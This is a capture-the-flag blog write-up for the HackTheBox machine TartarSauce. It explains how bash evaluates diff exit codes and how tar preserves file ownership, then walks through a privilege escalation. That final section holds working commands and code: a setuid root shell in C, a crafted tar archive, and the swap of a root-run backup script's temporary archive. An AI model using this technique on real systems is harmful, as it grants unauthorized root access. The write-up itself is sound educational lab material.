---
title: HTB TartarSauce: backuperer Follow-Up
url: https://0xdf.gitlab.io/2018/10/21/htb-tartarsauce-part-2-backuperer-follow-up.html
date: 2018-10-21T10:12:39+00:00
tags: ctf, hackthebox, htb-tartarsauce, tar, diff
---

I always watch IppSec’s videos on the retired box, because even if I completed the box, I typically learn something. Watching [IppSec’s TartarSauce video](https://www.youtube.com/watch?v=9MeBiP637ZA) yesterday left me with three things I wanted to play with a bit more in depth, each related to the `backuperer` script. First, the issue of a bash if statement, and how it evaluates on exit status. Next, how Linux handles permissions and ownership between hosts and in and out of archives. Finally, I was wrong in thinking there wasn’t a way to get a root shell… so of course I have to do that.

## bash if/else

### diff Exit Status

`backuperer` checks and `if` against the return code from running a diff. So what are the return codes for diff? From `man diff` on TartarSauce:

> Exit status is 0 if inputs are the same, 1 if different, 2 if trouble.

### bash Resolving if Command

So I’ll test each of the three cases.

#### Exit 0 - Inputs The Same

Create two files the same, and run `diff`. I’ll print the exit status from `$?`, and in this case, we see it’s 0 as expected:

```

root@kali# echo "Testing" > test
root@kali# cp test test-cp
root@kali# diff test test-cp 
root@kali# echo $?
0

```

Now to test it in a bash if statement:

```

root@kali# if [[ $(diff test test-cp) ]]; then echo "Resolved True"; else echo "Resolved False"; fi
Resolved False

```

So files match exits with 0, and bash resolves to false in if.

#### Exit 1 - Inputs Differ

Now with a different file, we’ll see the exit status of 1, as expected:

```

root@kali# echo "Something different" > test-diff
root@kali# diff test test-diff 
1c1
< Testing
---
> Something different
root@kali# echo $?
1

```

In an if statement, this resolves to true:

```

root@kali# if [[ $(diff test test-diff) ]]; then echo "Resolved True"; else echo "Resolved False"; fi
Resolved True

```

#### Exit 2 - Something Failed

Now I’ll use a file that doesn’t exist, and see exit status 2:

```

root@kali# diff test test-dne
diff: test-dne: No such file or directory
root@kali# echo $?
2

```

And the if resolves it as false:

```

root@kali# if [[ $(diff test test-dne) ]]; then echo "Resolved True"; else echo "Resolved False"; fi
diff: test-dne: No such file or directory
Resolved False

```

This is a bit unintuitive. Shouldn’t a `if [[ 2 ]]` resolve to true? In fact, it does:

```

root@kali# diff test test-dne; if [[ $? ]]; then echo "Resolved True"; else echo "Resolved False"; fi
diff: test-dne: No such file or directory
Resolved True

```

That’s the same test, just checking the exit status instead of running the command inside the if. It looks like bash tries to help by matching failure (as exit status greater than 1 is typically a failure) with false when the command it run inside the if.

#### Summary

For commands run inside the if, as is done in `backuperer`:

| Files | Exit Status | If Resolution |
| --- | --- | --- |
| Same | 0 | False |
| Differ | 1 | True |
| Error | 2 | False |

## Linux Permissions

The way that IppSec used file owners / permissions inside of `tar` was interesting. `tar` maintains owner / group / permissions… sometimes. I wanted to dig in to that more.

### When tar Maintains Owner / Group

For one, if I can create a suid binary owned by root on my kali box, move it to another system, extract it, and have a root owned suid binary on that box, that’s obviously a huge security hole. Spoiler alert, that doesn’t work. So here’s why.

When root extracts an archive, it does maintain owner / group. For example. I’ll create three files, owned by root, ssh, and mail:

```

root@kali# echo "hello" > test
root@kali# cp test test-ssh
root@kali# chown ssh:ssh test-ssh 
root@kali# cp test test-nobody
root@kali# chown nobody:nobody test-nobody 
root@kali# ls -l
total 12
-rw-r--r-- 1 root     root     6 Oct 21 11:05 test
-rw-r--r-- 1 nobody   nobody   6 Oct 21 11:06 test-nobody
-rw-r--r-- 1 ssh      ssh      6 Oct 21 11:05 test-ssh

```

Now add them to an archive:

```

root@kali# tar cvf test.tar *
test
test-nobody
test-ssh
root@kali# ls -l
total 24
-rw-r--r-- 1 root     root         6 Oct 21 11:05 test
-rw-r--r-- 1 nobody   nobody       6 Oct 21 11:06 test-nobody
-rw-r--r-- 1 ssh      ssh          6 Oct 21 11:05 test-ssh
-rw-r--r-- 1 root     root     10240 Oct 21 11:07 test.tar

```

Now in a different directory, extract, and the owners/groups are maintained:

```

root@kali# tar xvf test.tar 
test
test-nobody
test-ssh
root@kali# ls -l
total 24
-rw-r--r-- 1 root     root         6 Oct 21 11:05 test
-rw-r--r-- 1 nobody   nobody       6 Oct 21 11:06 test-nobody
-rw-r--r-- 1 ssh      ssh          6 Oct 21 11:05 test-ssh
-rw-r--r-- 1 root     root     10240 Oct 21 11:08 test.tar

```

However, if I drop to a different user, that user is not able to extract preserving owner/group, so it writes them out as owned by itself:

```

root@kali# su ssh
ssh@kali$ ls
test.tar
ssh@kali$ tar xvf test.tar
test
test-nobody
test-ssh
ssh_user@kali$ ls -l
total 24
-rw-r--r-- 1 ssh      ssh          6 Oct 21 11:05 test
-rw-r--r-- 1 ssh      ssh          6 Oct 21 11:06 test-nobody
-rw-r--r-- 1 ssh      ssh          6 Oct 21 11:05 test-ssh
-rw-r--r-- 1 root     root     10240 Oct 21 11:08 test.tar

```

So to have tar maintain owner/group, the user running tar must have permission to write as that owner/group.

### User Names vs User IDs

One other thing to remember is that tar doesn’t write the username or group name into the file, but rather the id. If we look at the last line of my `/etc/passwd` file, ssh user is id 1000. `/etc/group` will show the group id:

```

root@kali# tail -1 /etc/passwd
ssh:x:1000:1000::/home/ssh:/bin/sh
root@kali# tail -1 /etc/group
ssh:x:1000:

```

So, if I take my same test.tar, and move it to a different host. And on this host, I extract it as root, how will it preserve owner/group? If I use tar to just list the files inside the archive, it obviously carried the names with it as well:

```

~$ tar tvf test.tar 
-rw-r--r-- root/root         6 2018-10-21 11:05 test
-rw-r--r-- nobody/nobody     6 2018-10-21 11:06 test-nobody
-rw-r--r-- ssh/ssh           6 2018-10-21 11:05 test-ssh

```

But when I extract as root, and thus expect the owner/group to be preserved, the files are now owned by the users who have the same ids as the owners on the original host:

```

~$ sudo tar xvf test.tar
test
test-nobody
test-ssh
~$ ls -l
-rw-r--r-- 1 root   root      6 Oct 21 11:05 test
-rw-r--r-- 1 nobody   999     6 Oct 21 11:06 test-nobody
-rw-r--r-- 1 df     df        6 Oct 21 11:05 test-ssh
-rw-r--r-- 1 df     df    10240 Oct 21 11:22 test.tar

```

It looks like the nobody user shares the same user id on both hosts. However, the nobody group is 999 on the creating host, but there is no group 999 on the extracting host. And the ssh user on the creating host has the same id as the df user on the new host.

Still, if I extract the file as df, all the extracted files have the owner/group of df, as df doesn’t have permissions to write as other users.

## Root Shell

### Strategy

Putting all of this together, it’s actually quite easy to get a root shell on TartarSauce. I’ll take advantage of two bits:
1. `backuperer` extracts the archive to `$check`, which is `/var/tmp/check`. Since this is run by root, permissions from within the archive will be preserved.
2. As long as the `if [[ $(integrity_chk) ]]` returns true, the extracted directory is not deleted until the next time the script is run.

So, to get a shell, I’ll create a suid binary on my local machine in a `var/www/html` folder, put it into a tar archive, let root extract it on TartarSauce, and then make use of the shell.

### Creating suid Shell

I’ll start with a really simple `suid.c`:

```

int main(void){
  setresuid(0, 0, 0);
  system("/bin/bash");
}

```

Since TartarSauce is x86, I’ll compile with the -m32 flag and ignore those warnings:

```

root@kali# gcc -m32 -o suid suid.c
suid.c: In function ‘main’:
suid.c:2:3: warning: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration]
   setresuid(0, 0, 0);
   ^~~~~~~~~
suid.c:3:3: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
   system("/bin/bash");
   ^~~~~~

```

Finally, I’ll add the setuid bit:

```

root@kali# chmod 6555 suid
root@kali# ls -l suid*
-r-sr-sr-x 1 root root 15484 Oct 21 11:44 suid
-rwxr-x--- 1 root root    63 Oct 21 11:44 suid.c

```

### Add to Archive

#### Why Do I Need var/www/html Directories?

Next add it to a gzipped archive using tar. I’m going to need to mirror the directory structure on target. Why? Let’s see what happens if we don’t. We’ll create a .tar.gz file that contains suid.

It will be unzipped to `/var/tmp/check/suid`.

Then, `integrity_chk()` will be run, which will `diff /var/www/html /var/tmp/check/var/www/html`. That will exit with a 2, since that directory doesn’t exit. And as we saw above, that means the `if [[ $(integrity_chk) ]]` will evaluate false, and then the code will move to the section that cleans up.

#### Create Archive

Create directories (`-p` will create all the directories needed), add the file, and reset the suid bit:

```

root@kali# mkdir -p  var/www/html
root@kali# cp suid var/www/html/
root@kali# chmod 6555 var/www/html/suid

```

Now make the archive. I’ll make use of the `--owner` and `--group` options to make sure it is owned by root (unnecessary, but a neat trick if you want to add a file with a different owner/group):

```

root@kali# tar zcvf suid.tar.gz var --owner=root --group=root
var/
var/www/
var/www/html/
var/www/html/suid

```

### Replace Archive

Use `python3 -m http.server 9000` to create a webserver on my local box, and then get the archive with `wget`.

Then use `systemctl list-timers` to wait for when the job runs, and the temporary archive is created. When it is, replace it with my archive.

Use `systemctl list-timers` to see when the archive will appear:

```

onuma@TartarSauce:/var/tmp$ systemctl list-timers
NEXT                         LEFT     LAST                         PASSED       UNIT                         ACTIVATES
Sun 2018-10-21 14:05:40 EDT  2s left  Sun 2018-10-21 14:00:40 EDT  4min 57s ago backuperer.timer             backuperer.service
Sun 2018-10-21 14:06:27 EDT  49s left Sat 2018-10-20 19:31:58 EDT  18h ago      apt-daily.timer              apt-daily.service
Mon 2018-10-22 06:10:48 EDT  16h left Sun 2018-10-21 06:42:35 EDT  7h ago       apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2018-10-22 11:29:12 EDT  21h left Sun 2018-10-21 11:29:12 EDT  2h 36min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service  

```

See the archive:

```

onuma@TartarSauce:/var/tmp$ ls -la
total 9172
drwxrwxrwt  8 root  root     4096 Oct 21 14:05 .
drwxr-xr-x 14 root  root     4096 Feb  9  2018 ..
-rw-r--r--  1 onuma onuma 9355264 Oct 21 14:05 .8dc600473f3730872b2c52a44da6d0bd4efb2297
-rw-r--r--  1 onuma onuma    2715 Oct 21  2018 suid.tar.gz
drwx------  3 root  root     4096 Feb 17  2018 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
drwx------  3 root  root     4096 Feb 17  2018 systemd-private-7bbf46014a364159a9c6b4b5d58af33b-systemd-timesyncd.service-UnGYDQ
drwx------  3 root  root     4096 Feb 15  2018 systemd-private-9214912da64b4f9cb0a1a78abd4b4412-systemd-timesyncd.service-bUTA2R
drwx------  3 root  root     4096 Feb 15  2018 systemd-private-a3f6b992cd2d42b6aba8bc011dd4aa03-systemd-timesyncd.service-3oO5Td
drwx------  3 root  root     4096 Oct 20 11:14 systemd-private-b120a3d973224fcfb7073b9bfabac416-systemd-timesyncd.service-f9rGuA
drwx------  3 root  root     4096 Feb 15  2018 systemd-private-c11c7cccc82046a08ad1732e15efe497-systemd-timesyncd.service-QYRKER  

```

Move mine over it:

```

onuma@TartarSauce:/var/tmp$ cp suid.tar.gz .8dc600473f3730872b2c52a44da6d0bd4efb2297
onuma@TartarSauce:/var/tmp$ ls -la
total 40
drwxrwxrwt  8 root  root  4096 Oct 21 14:05 .
drwxr-xr-x 14 root  root  4096 Feb  9  2018 ..
-rw-r--r--  1 onuma onuma 2715 Oct 21 14:05 .8dc600473f3730872b2c52a44da6d0bd4efb2297
-rw-r--r--  1 onuma onuma 2715 Oct 21  2018 suid.tar.gz
drwx------  3 root  root  4096 Feb 17  2018 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
drwx------  3 root  root  4096 Feb 17  2018 systemd-private-7bbf46014a364159a9c6b4b5d58af33b-systemd-timesyncd.service-UnGYDQ
drwx------  3 root  root  4096 Feb 15  2018 systemd-private-9214912da64b4f9cb0a1a78abd4b4412-systemd-timesyncd.service-bUTA2R
drwx------  3 root  root  4096 Feb 15  2018 systemd-private-a3f6b992cd2d42b6aba8bc011dd4aa03-systemd-timesyncd.service-3oO5Td
drwx------  3 root  root  4096 Oct 20 11:14 systemd-private-b120a3d973224fcfb7073b9bfabac416-systemd-timesyncd.service-f9rGuA
drwx------  3 root  root  4096 Feb 15  2018 systemd-private-c11c7cccc82046a08ad1732e15efe497-systemd-timesyncd.service-QYRKER

```

### Get Shell

Wait for 30 seconds and then go into `check`, find the shell, and run it:

```

onuma@TartarSauce:/var/tmp$ cd check/var/www/html
onuma@TartarSauce:/var/tmp/check/var/www/html$ ls
suid
onuma@TartarSauce:/var/tmp/check/var/www/html$ ls -l
total 16
-r-sr-sr-x 1 root root 15484 Oct 21 13:58 suid
onuma@TartarSauce:/var/tmp/check/var/www/html$ ./suid
./suid
id
uid=0(root) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)

```

Now I’ve got a root shell on TartarSauce.

[« HTB: TartarSauce](/2018/10/20/htb-tartarsauce.html)